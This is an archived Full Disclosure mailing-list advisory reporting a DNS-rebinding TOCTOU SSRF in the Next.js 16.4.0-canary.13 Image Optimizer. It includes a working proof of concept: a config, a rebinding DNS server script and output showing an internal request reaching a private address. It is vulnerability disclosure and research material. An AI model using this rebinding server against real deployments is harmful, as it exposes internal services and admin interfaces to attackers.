---
title: Next.js 16.4.0-canary.13 Image Optimizer DNS Rebinding TOCTOU SSRF Still Exists
url: https://seclists.org/fulldisclosure/2026/Sep/29
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:31.216077
---

# Next.js 16.4.0-canary.13 Image Optimizer DNS Rebinding TOCTOU SSRF Still Exists

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](28)
[By Date](date.html#29)
[![Next](/images/right-icon-16x16.png)](30)

[![Previous](/images/left-icon-16x16.png)](28)
[By Thread](index.html#29)
[![Next](/images/right-icon-16x16.png)](30)

![](/shared/images/nst-icons.svg#search)

# Next.js 16.4.0-canary.13 Image Optimizer DNS Rebinding TOCTOU SSRF Still Exists

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Tue, 1 Sep 2026 19:48:36 -0400

---

```
Next.js 16.4.0-canary.13 contains a DNS rebinding TOCTOU Server-Side
Request Forgery vulnerability in the Image Optimizer's fetchExternalImage()
functionality.

Next.js attempts to prevent requests to private network resources by
resolving the supplied hostname and checking the resulting addresses using
isPrivateIp():

const records = await lookup(hostname, {
  family: 0,
  all: true,
  hints: ALL,
})

const privateIps = records.map((record) => record.address)

if (privateIps.some((ip) => isPrivateIp(ip))) {
  throw new ImageError(400, '"url" parameter is not allowed')
}

After the DNS validation succeeds, the application performs the external
request using the original URL:

const res = await fetch(href, {
  signal: AbortSignal.timeout(7_000),
  redirect: 'manual',
})

The IP address validated by lookup() is not pinned to the subsequent HTTP
connection. As a result, fetch() can perform another DNS resolution for the
same hostname.

An attacker-controlled DNS server can return a public IP address during the
first resolution, allowing the hostname to pass the private-IP validation,
and then return a private IP address during the subsequent resolution
performed for the HTTP connection.

This causes Next.js to validate one network destination but ultimately
connect to another, bypassing the Image Optimizer's private-network SSRF
protection.

Testing confirms that this vulnerability *still exists in Next.js
16.4.0-canary.13*.
Impact

A remote attacker can bypass the Next.js Image Optimizer's private-IP
protections and cause the application server to issue HTTP requests to
private network resources.

Depending on the deployment environment, this may allow access to internal
APIs, container-network services, RFC1918 addresses, localhost services,
administrative interfaces, or other HTTP services reachable from the
Next.js server.

The demonstrated proof confirms that the server establishes an HTTP
connection to a private address after validating a public DNS response.
Although the Image Optimizer subsequently rejects the returned content
because it is not a valid image, the internal HTTP request has already
occurred.
Proof of Concept

The vulnerability was reproduced using an isolated Docker environment
containing a controlled DNS server, Next.js 16.4.0-canary.13, and a private
HTTP service.

The controlled hostname rebind.test is permitted by the application's image
configuration:

module.exports = {
  images: {
    remotePatterns: [
      {
        protocol: 'http',
        hostname: 'rebind.test',
        pathname: '/**',
      },
    ],
  },
}

The controlled DNS server returns a public IP address for the first
A-record lookup and the private Docker-network address for the second
lookup:

const { Packet, UDPServer } = require('dns2')

let addressLookups = 0

const server = new UDPServer((request, send) => {
  const response = Packet.createResponseFromRequest(request)
  const question = request.questions[0]

  if (question.type === Packet.TYPE.A) {
    addressLookups++

    const address =
      addressLookups === 1 ? '93.184.216.34' : '172.30.0.4'

    response.answers.push({
      name: question.name,
      type: Packet.TYPE.A,
      class: Packet.CLASS.IN,
      address,
      ttl: 5,
    })

    console.log(`A lookup ${addressLookups}: ${address}`)
  }

  send(response)
})

server.bind(53, '0.0.0.0')
console.log('DNS server listening on UDP 53')

The first lookup returns:

93.184.216.34

The second lookup returns:

172.30.0.4

The private service listens on 172.30.0.4:8080 and records any HTTP request
it receives.

The PoC is executed using:

$ poc.sh

PoC Output

$ poc.sh
Next container command: ["npx","next","start"]
internal-1  | Private listener listening on 0.0.0.0:8080
internal-1  | GET /secret HTTP/1.1
next-1      | ▲ Next.js 16.4.0-canary.13
next-1      | - Local:         http://localhost:3000
next-1      | - Network:       http://172.30.0.3:3000
next-1      | ✓ Ready in 94ms
next-1      | ✓ Running next.config.js took 16ms
next-1      | ⨯ The requested resource isn't a valid image for
http://rebind.test:8080/secret received null
internal-1  | Host: rebind.test:8080
dns-1       | DNS server listening on UDP 53
dns-1       | A lookup 1: 93.184.216.34
dns-1       | A lookup 2: 172.30.0.4
PoC passed: public validation was followed by an HTTP request to a
private Docker-network address.

The output demonstrates that the first DNS resolution returned the public
IP address 93.184.216.34, which passed the Next.js private-IP validation.

The second DNS resolution returned the private Docker-network address
172.30.0.4.

The private listener then received:

GET /secret HTTP/1.1
Host: rebind.test:8080

This confirms that Next.js validated the hostname using the public DNS
response but subsequently established an HTTP connection to the private
network address.

The following Next.js error does not invalidate the SSRF:

The requested resource isn't a valid image for
http://rebind.test:8080/secret received null

The response is intentionally plain text rather than an image. The internal
HTTP request occurs before the Image Optimizer rejects the response, as
demonstrated by the private listener receiving GET /secret.

Therefore, the PoC confirms that the private-IP restriction can be bypassed
using DNS rebinding.

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](28)
[By Date](date.html#29)
[![Next](/images/right-icon-16x16.png)](30)

[![Previous](/images/left-icon-16x16.png)](28)
[By Thread](index.html#29)
[![Next](/images/right-icon-16x16.png)](30)

### Current thread:

* **Next.js 16.4.0-canary.13 Image Optimizer DNS Rebinding TOCTOU SSRF Still Exists** *Ron E (Sep 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools...